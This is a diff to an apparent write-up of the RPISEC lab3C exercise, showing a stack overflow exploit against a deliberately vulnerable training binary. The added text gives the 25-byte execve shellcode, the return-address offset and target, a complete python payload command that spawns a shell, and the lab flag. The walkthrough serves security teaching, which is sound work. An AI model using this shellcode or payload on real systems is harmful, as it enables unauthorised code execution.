@@ -94,7 +94,7 @@ Entered as the password, with `rpisec` given as the username to clear the gate, 
 
 ![](./img/frame_3C.png)
 
-The read is worth being precise about, because it tells us which frame the bug lives in. `eip` is a healthy address inside `main`, and only the **saved** `eip` reads `0x62626262`, which is our four `b` bytes. If the overflow had sat in a buffer inside the password-checking helper and clobbered that helper's saved return, the helper's `ret` would already have jumped into our bytes and `eip` would read `0x62626262`, not a clean `main` address. It did not. The helper returned cleanly into `main`, and the corrupted slot belongs to **`main`'s** frame. The password therefore reads into a buffer in `main`, and the slot we control is `main`'s saved return address at `0xbffff6fc`.
+Only the **saved** `eip` reads `0x62626262`, our four `b` bytes, so the slot we control is `main`'s saved return address at `0xbffff6fc`. `verify_user_pass` runs after the overflowing read, so it returns normally and the hijack lands on `main`'s `ret`, not the helper's.
 
 ## The bug
  
@@ -114,3 +114,55 @@ So the payload shape is fixed:
 ```
 
 Saved `ebp` at offset 76 is also overwritten, which is harmless here. `main` never returns normally in our run, so a corrupted `ebp` costs us nothing.
+
+## A stable execution address
+
+With NX off we need an executable address to hold the shellcode, and the two `fgets` give two candidates.
+ 
+The stack buffer moves between the debugger and a direct run, so a hardcoded jump into it is unreliable. The username global does not move: `fgets(0x8049c40, 256, stdin)` stores our input at a fixed, non-PIE address, and the gate checks only the first six bytes, so everything after `rpisec` is ours. We put the shellcode there and point the saved EIP at `0x8049c46`, the byte past `rpisec`.
+
+## Writing the shellcode
+
+The code we host has to call `execve("/bin/sh", ...)` and contain no null byte and no `0x0a`, since either would end an `fgets`. The standard 25-byte stub does it:
+ 
+```asm
+31 c0              xor  eax, eax         ; eax = 0
+50                 push eax              ; string terminator
+68 2f 2f 73 68     push 0x68732f2f       ; "//sh"
+68 2f 62 69 6e     push 0x6e69622f       ; "/bin"
+89 e3              mov  ebx, esp         ; ebx -> "/bin//sh"
+50                 push eax              ; argv terminator
+89 e2              mov  edx, esp         ; envp = NULL
+53                 push ebx
+89 e1              mov  ecx, esp         ; argv = { "/bin//sh", NULL }
+b0 0b              mov  al, 0x0b         ; __NR_execve
+cd 80              int  0x80
+```
+ 
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
+\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+ 
+The doubled slash in `/bin//sh` pads the path to eight bytes so both pushes are null-free, and the kernel reads `//` as `/`. There is no `0x00` and no `0x0a` in the bytes, so both reads carry it intact.
+
+## Exploitation
+
+The username line carries the shellcode, the password line carries the overflow. Neither contains a newline before its terminator, so each `fgets` takes exactly one line:
+
+```
+username:  rpisec + <25-byte stub>
+password:  "A" * 80 + \x46\x9c\x04\x08      ; saved EIP -> 0x8049c46
+```
+ 
+`verify_user_name` matches on `rpisec`, which leaves the stub resting at `0x8049c46`. The password then overwrites the saved return address with that same address. The offset is a fixed 80: ASLR stays off through this stage of the course, so the stack sits in the same place on every run and the single placement lands deterministically. When `main` returns it jumps into the stub and spawns `/bin/sh` with `lab3B`'s euid. The shell inherits stdin, so we keep it open with a trailing `cat`:
+ 
+```
+(python -c 'print "rpisec" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A"*80 + "\x46\x9c\x04\x08"'; cat) | ./lab3C
+```
+
+Two details of the output look like failure and are not. The program prints `nope, incorrect password...` before the shell appears, because the overflow happens at the password `fgets`, before `verify_user_pass` runs. The check still executes against our filler, fails, and prints its message, and only then does `main` reach `ret` and jump into the stub. The message is normal output, not a failed exploit. And the spawned `sh` has no prompt, because stdin is the pipe rather than a terminal, so it runs non-interactively. Commands still execute:
+
+![](./img/solved_2C.png)
+
+Flag: `th3r3_iz_n0_4dm1ns_0n1y_U!`
